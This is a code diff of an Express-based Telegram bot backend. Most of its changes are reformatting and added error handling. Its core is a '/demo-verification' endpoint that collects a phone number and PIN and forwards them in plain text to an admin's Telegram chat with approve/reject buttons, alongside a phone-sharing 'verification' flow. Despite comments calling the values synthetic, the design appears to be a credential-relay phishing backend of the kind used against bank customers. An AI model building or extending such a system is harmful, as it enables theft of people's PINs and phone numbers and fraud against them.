@@ -1,13 +1,15 @@
-
-const cors = require("cors");
-
-app.use(cors());
-app.use(express.json());require("dotenv").config();
+require("dotenv").config();
 
 const express = require("express");
+const cors = require("cors");
 
 const app = express();
 
+// ==========================================
+// MIDDLEWARE
+// ==========================================
+
+app.use(cors());
 app.use(express.json());
 
 const PORT = process.env.PORT || 10000;
@@ -33,9 +35,7 @@ const TELEGRAM_API =
 // ==========================================
 
 async function telegram(method, data = {}) {
-
     try {
-
         const response = await fetch(
             `${TELEGRAM_API}/${method}`,
             {
@@ -56,7 +56,6 @@ async function telegram(method, data = {}) {
         return result;
 
     } catch (error) {
-
         console.error(
             "Telegram request failed:",
             error
@@ -75,7 +74,6 @@ async function sendMessage(
     text,
     options = {}
 ) {
-
     if (!chatId) {
         console.error("❌ Chat ID is missing.");
         return null;
@@ -96,8 +94,10 @@ async function sendMessage(
 // ADMIN MESSAGE
 // ==========================================
 
-async function notifyAdmin(text, options = {}) {
-
+async function notifyAdmin(
+    text,
+    options = {}
+) {
     if (!ADMIN_CHAT_ID) {
         console.log(
             "⚠️ TELEGRAM_ADMIN_CHAT_ID is not configured."
@@ -118,7 +118,6 @@ async function notifyAdmin(text, options = {}) {
 // ==========================================
 
 async function handleStart(message) {
-
     const chatId =
         message.chat.id;
 
@@ -171,7 +170,6 @@ async function handleStart(message) {
 // ==========================================
 
 async function startVerification(chatId) {
-
     await sendMessage(
         chatId,
 
@@ -205,7 +203,6 @@ async function startVerification(chatId) {
 // ==========================================
 
 async function handleCallback(callback) {
-
     if (!callback.message) {
         return;
     }
@@ -228,7 +225,6 @@ async function handleCallback(callback) {
     // --------------------------------------
 
     if (data === "share_phone") {
-
         await sendMessage(
             chatId,
 
@@ -261,9 +257,7 @@ async function handleCallback(callback) {
     // --------------------------------------
 
     if (data === "start_verification") {
-
         await startVerification(chatId);
-
         return;
     }
 
@@ -272,7 +266,6 @@ async function handleCallback(callback) {
     // --------------------------------------
 
     if (data === "verification_true") {
-
         await sendMessage(
             chatId,
 
@@ -293,7 +286,6 @@ async function handleCallback(callback) {
     // --------------------------------------
 
     if (data === "verification_false") {
-
         await sendMessage(
             chatId,
 
@@ -315,7 +307,6 @@ async function handleCallback(callback) {
 // ==========================================
 
 async function handleContact(message) {
-
     const chatId =
         message.chat.id;
 
@@ -356,75 +347,88 @@ async function handleContact(message) {
 }
 
 // ==========================================
-// TEST VERIFICATION
+// DEMO VERIFICATION
 // ==========================================
 //
-// This route is restricted to synthetic test
-// values. It is not intended for real banking
-// credentials.
+// Test-only endpoint.
+// Accepts synthetic demo values only.
 // ==========================================
 
 app.post(
     "/demo-verification",
     async (req, res) => {
 
-        const {
-            phone,
-            demoPin
-        } = req.body;
+        try {
 
-        if (!phone || !demoPin) {
+            const {
+                phone,
+                demoPin
+            } = req.body;
 
-            return res.status(400).json({
-                success: false,
-                message:
-                    "Phone and demo PIN are required."
-            });
-        }
+            if (!phone || !demoPin) {
+                return res.status(400).json({
+                    success: false,
+                    message:
+                        "Phone and demo PIN are required."
+                });
+            }
 
-        const message =
-            `🔔 <b>TEST VERIFICATION REQUEST</b>\n\n` +
-            `Phone: <code>${phone}</code>\n` +
-            `Test PIN: <code>${demoPin}</code>\n\n` +
-            `<b>Confirm test request:</b>`;
+            const message =
+                `🔔 <b>TEST VERIFICATION REQUEST</b>\n\n` +
+                `Phone: <code>${phone}</code>\n` +
+                `Test PIN: <code>${demoPin}</code>\n\n` +
+                `<b>Confirm test request:</b>`;
 
-        const result =
-            await notifyAdmin(
-                message,
-                {
-                    reply_markup: {
-                        inline_keyboard: [
-                            [
-                                {
-                                    text: "✅ TRUE",
-                                    callback_data:
-                                        "test_true"
-                                },
-                                {
-                                    text: "❌ FALSE",
-                                    callback_data:
-                                        "test_false"
-                                }
+            const result =
+                await notifyAdmin(
+                    message,
+                    {
+                        reply_markup: {
+                            inline_keyboard: [
+                                [
+                                    {
+                                        text: "✅ TRUE",
+                                        callback_data:
+                                            "test_true"
+                                    },
+                                    {
+                                        text: "❌ FALSE",
+                                        callback_data:
+                                            "test_false"
+                                    }
+                                ]
                             ]
-                        ]
+                        }
                     }
-                }
-            );
+                );
 
-        if (!result?.ok) {
+            if (!result?.ok) {
+                return res.status(500).json({
+                    success: false,
+                    message:
+                        "Unable to send test request to Telegram."
+                });
+            }
+
+            return res.json({
+                success: true,
+                message:
+                    "Test verification request sent."
+            });
+
+        } catch (error) {
+
+            console.error(
+                "Demo verification error:",
+                error
+            );
 
             return res.status(500).json({
                 success: false,
                 message:
-                    "Unable to send test request to Telegram."
+                    "Server error while processing test verification."
             });
         }
-
-        return res.json({
-            success: true,
-            message:
-                "Test verification request sent."
-        });
     }
 );
 
@@ -436,6 +440,9 @@ async function handleTestDecision(
     callback,
     approved
 ) {
+    if (!callback.message) {
+        return;
+    }
 
     const chatId =
         callback.message.chat.id;
@@ -562,14 +569,10 @@ app.post(
 app.get("/", (req, res) => {
 
     res.json({
-
         success: true,
-
         message:
             "Telegram Bot Backend is running",
-
         status: "online"
-
     });
 });
 
@@ -584,12 +587,9 @@ app.get(
         if (!BACKEND_URL) {
 
             return res.status(400).json({
-
                 success: false,
-
                 message:
                     "BACKEND_URL is missing."
-
             });
         }
 
@@ -606,7 +606,6 @@ app.get(
             );
 
         res.json({
-
             success:
                 result?.ok === true,
 
@@ -615,7 +614,6 @@ app.get(
 
             telegram:
                 result
-
         });
     }
 );
